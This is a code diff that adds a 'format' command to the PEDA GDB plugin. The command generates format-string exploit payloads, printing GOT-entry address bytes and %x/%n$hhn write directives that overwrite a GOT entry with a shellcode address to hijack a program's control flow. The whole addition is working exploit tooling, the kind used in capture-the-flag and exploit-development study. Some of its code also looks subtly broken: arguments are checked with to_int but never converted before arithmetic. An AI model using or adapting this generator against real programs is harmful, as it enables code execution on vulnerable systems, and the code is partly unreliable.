@@ -3253,6 +3253,95 @@ class PEDACmd(object):
 
         return
 
+    def format(self, *arg):
+        """
+        Generate format string payload (py format)
+        Usage:
+            MYNAME shellcode_address offset got_entry n_format
+        """
+        (shellcode_address, offset, got_entry, n_format) = normalize_argv(arg, 4)
+        if to_int(shellcode_address) is None:
+            self._missing_argument()
+        if to_int(offset) is None:
+            self._missing_argument()
+        if to_int(got_entry) is None:
+            self._missing_argument()
+        if to_int(n_format) is None:
+            self._missing_argument()
+
+        # Make got
+        _got = [got_entry, got_entry+1, got_entry+2, got_entry+3]
+        # because we GOT then offset+16
+        offset += 16
+
+        # Make ret bytes
+        _b1  = (shellcode_address >> 24) & 0xff
+        _b2  = (shellcode_address >> 16) & 0xff
+        _b3  = (shellcode_address >> 8) & 0xff
+        _b4  = (shellcode_address >> 0) & 0xff
+        (_f1,_f2,_f3,_f4) = (_b1,_b2,_b3,_b4)
+
+        # do the offsetting.
+        _r1 = _f4 - offset
+        while(int(_r1) <= 10):
+            _f4 += 0x100
+            _r1 = _f4 - offset
+
+        _r2 = _f3 - _b4
+        while(_r2 <= 10):
+            _f3 += 0x100
+            _r2 = _f3 - _b4
+
+        _r3 = _f2 - _b3
+        while(_r3 <= 10):
+            _f2 += 0x100
+            _r3 = _f2 - _b3
+
+        _r4 = _f1 - _b2
+        while(_r4 <= 10):
+            _f1 += 0x100
+            _r4 = _f1 - _b2
+
+        # generate nprime
+        n_prime = []
+        for i in range(0,4):
+            n_prime.append(n_format+i)
+
+        # Make got string
+        got_list = []
+        got_str  = ""
+        for gaddr in _got: got_list.append("%x" % gaddr)
+        for gaddr in got_list:
+            got_str += "\\x%s\\x%s\\x%s\\x%s" %\
+                    (gaddr[6:8], gaddr[4:6], gaddr[2:4], gaddr[0:2])
+        print "# Got offset"
+        print "payload = \"%s\"" % got_str
+
+        # Make ret payload
+        write_payload = ""
+        write_payload += "%"
+        write_payload += str(_r1)
+        write_payload += "x%"
+        write_payload += str(n_prime[0])
+        write_payload += "$hhn"
+        write_payload += "%"
+        write_payload += str(_r2)
+        write_payload += "x%"
+        write_payload += str(n_prime[1])
+        write_payload += "$hhn"
+        write_payload += "%"
+        write_payload += str(_r3)
+        write_payload += "x%"
+        write_payload += str(n_prime[2])
+        write_payload += "$hhn"
+        write_payload += "%"
+        write_payload += str(_r4)
+        write_payload += "x%"
+        write_payload += str(n_prime[3])
+        write_payload += "$hhn"
+        print "# Write 0x%x to 0x%x" % (shellcode_address, _got[0])
+        print "payload += \"%s\"" % write_payload
+
     def aslr(self, *arg):
         """
         Show/set ASLR setting of GDB
